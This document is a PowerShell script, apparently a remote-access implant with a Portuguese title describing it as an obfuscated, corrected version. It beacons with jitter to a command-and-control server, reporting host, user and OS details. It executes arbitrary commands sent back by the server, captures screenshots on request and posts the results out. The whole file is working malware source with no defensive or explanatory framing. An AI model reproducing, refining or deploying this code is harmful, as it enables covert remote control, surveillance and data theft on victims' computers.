# agent.ps1 - Versão Ofuscada Corrigida
$c2 = "http://192.168.0.10:8080/"
$bi = 30
$aid = [Environment]::MachineName + "_" + (Get-Random 9999)
$ji = 5
$to = 120

function sB {
    param($d)
    try {
        $b = @{id=$aid;data=$d;host=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption} | ConvertTo-Json
        $u = [Text.Encoding]::UTF8.GetBytes($b)
        $w = [Net.WebRequest]::Create("$c2/beacon")
        $w.Method = "POST"
        $w.ContentType = "application/json; charset=utf-8"
        $w.ContentLength = $u.Length
        $w.Timeout = 10000
        $w.Proxy = $null
        $r = $w.GetRequestStream()
        $r.Write($u,0,$u.Length)
        $r.Close()
        $resp = $w.GetResponse()
        $reader = New-Object IO.StreamReader($resp.GetResponseStream(),[Text.Encoding]::UTF8)
        $t = $reader.ReadToEnd()
        $reader.Close()
        $resp.Close()
        return $t | ConvertFrom-Json
    } catch { return $null }
}

function gS {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
        $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
        $b = New-Object Drawing.Bitmap $s.Width,$s.Height
        $g = [Drawing.Graphics]::FromImage($b)
        $g.CopyFromScreen($s.X,$s.Y,0,0,$s.Size)
        $m = New-Object IO.MemoryStream
        $b.Save($m,[Drawing.Imaging.ImageFormat]::Png)
        $b64 = [Convert]::ToBase64String($m.ToArray())
        $g.Dispose(); $b.Dispose(); $m.Dispose()
        return "SCREENSHOT_OK:" + $b64
    } catch { return "SCREENSHOT_ERR:" + $_ }
}

function eC {
    param([string]$c)
    try {
        if ($c.Trim().ToLower() -eq "screenshot") { return gS }
        $p = [Management.Automation.PowerShell]::Create()
        [void]$p.AddScript($c)
        $a = $p.BeginInvoke()
        if ($a.AsyncWaitHandle.WaitOne($to*1000)) {
            $r = $p.EndInvoke($a) | Out-String
        } else { $p.Stop(); $r = "COMMAND_TIMEOUT" }
        $p.Dispose()
        return $r
    } catch { return "CMD_ERR:" + $_ }
}

function sR {
    param($r,$i)
    try {
        $b = @{id=$aid;data=@{result=$r;command_id=$i}} | ConvertTo-Json -Depth 3 -Compress
        $u = [Text.Encoding]::UTF8.GetBytes($b)
        $w = [Net.WebRequest]::Create("$c2/result")
        $w.Method = "POST"
        $w.ContentType = "application/json; charset=utf-8"
        $w.ContentLength = $u.Length
        $w.Timeout = 10000
        $w.Proxy = $null
        $rq = $w.GetRequestStream()
        $rq.Write($u,0,$u.Length)
        $rq.Close()
        $resp = $w.GetResponse()
        $resp.Close()
    } catch {}
}

while ($true) {
    $resp = sB "heartbeat"
    if ($resp -and $resp.command) {
        $res = eC $resp.command
        sR $res $resp.id
    }
    Start-Sleep -Seconds ($bi + (Get-Random -Min -$ji -Max $ji))
}
